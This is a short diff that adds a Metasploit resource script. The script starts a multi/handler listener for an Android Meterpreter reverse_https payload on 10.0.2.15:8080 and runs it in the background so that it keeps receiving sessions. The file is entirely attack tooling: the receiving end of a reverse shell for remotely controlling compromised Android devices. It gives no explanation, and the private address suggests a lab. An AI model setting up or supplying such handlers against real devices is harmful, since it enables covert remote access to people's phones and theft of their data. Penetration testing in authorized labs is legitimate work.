@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_https
+set LHOST 10.0.2.15
+set LPORT 8080
+set ExitOnSession false
+exploit -j -z
